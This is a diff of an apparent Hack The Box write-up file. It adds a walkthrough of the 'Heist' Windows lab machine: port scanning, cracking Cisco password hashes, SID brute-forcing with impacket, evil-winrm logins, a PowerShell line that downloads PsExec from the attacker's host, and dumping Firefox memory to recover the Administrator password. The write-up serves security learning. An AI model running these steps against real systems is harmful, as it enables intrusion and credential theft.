@@ -93,7 +93,7 @@ use id_rsa and pass for gilfoyle to ssh in
 
 ssh -i hash gilfoyle@10.10.10.110
 
-USER FLAG
+### USER FLAG
 
 cd /usr/local/bin vault file... The Vault SSH secrets engine provides secure authentication and authorization for access to machines via the SSH protocol.
 
@@ -109,10 +109,69 @@ An authenticated client requests credentials from the Vault server and, If autho
 
 ssh into box with key as password
 
-ROOT FLAG
+### ROOT FLAG
 
 
 
 I completed this box during my first semester and it was the most challenging and engaging yet. The ones that I have done at the time of writing are a bit harder and some just as interesting which I will upload soon!
 
 
+## Heist Writeup:
+
+This is one of the first windows machines I hacked and was a great learning experience. From this, I learnt of tools that would help me in future machines.
+
+`PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49669/tcp open msrpc Microsoft Windows RPC`
+
+http://10.10.10.149/login.php login as guest
+
+http://10.10.10.149/attachments/config.txt Cisco router config^^^
+
+> gobuster dir -e -u http://10.10.10.149/ -w /usr/share/wordlists/dirb/common.txt
+
+`http://10.10.10.149/attachments (Status: 301) http://10.10.10.149/css (Status: 301) http://10.10.10.149/images (Status: 301) http://10.10.10.149/Images (Status: 301) http://10.10.10.149/index.php (Status: 302) http://10.10.10.149/js (Status: 301)`
+
+One username on windows server is Hazard... hostname ios-1
+
+Crack cisco passwords with john:
+
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91---> stealth1agent
+
+Cisco type 7 password cracker --> http://www.ifm.net.nz/cookbooks/passwordcracker.html
+
+username rout3r password 7 0242114B0E143F015F5D1E161713--> $uperP@ssword
+
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 -- > Q4)sJu\Y8qz*A3?d
+
+A SID, short for security identifier, is a number used to identify user, group, and computer accounts in Windows.
+
+lookupsid.py: This script allows you to bruteforce the Windows SID, aiming at finding remote users/groups.
+
+https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/
+
+get impacket here: https://github.com/SecureAuthCorp/impacket/tree/master/examples
+
+./lookupsid.py hazard@10.10.10.149 use password > stealthagent
+
+`500: SUPPORTDESK\Administrator (SidTypeUser) 501: SUPPORTDESK\Guest (SidTypeUser) 503: SUPPORTDESK\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\None (SidTypeGroup) 1008: SUPPORTDESK\Hazard (SidTypeUser) 1009: SUPPORTDESK\support (SidTypeUser) 1012: SUPPORTDESK\Chase (SidTypeUser) 1013: SUPPORTDESK\Jason (SidTypeUser)`
+
+> evil-winrm -i 10.10.10.149 -u Chase -p "Q4)sJu\Y8qz*A3?d" DROP SHELL! (powershell)
+
+cd Desktop
+
+### USER FLAG!!
+
+Get-Process --procdump and sysinternals...
+
+psexec... use simplehttpserver to upload .exe to machine...
+
+$client = new-object System.Net.WebClient $client.DownloadFile(“http://10.10.14.182:8000/PSTools/PsExec.exe”,“C:\Users\Chase\Documents\PsExec.exe”) same for procdump.exe
+
+firefox.exe process procdump -ma firefox.exe...dmp download C:\Users\Chase\Videos /root
+
+strings .dmp file | grep 'admin'
+
+Password = 4dD!5}x/re8]FBuZ
+
+> evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
+
+### ROOT FLAG!!
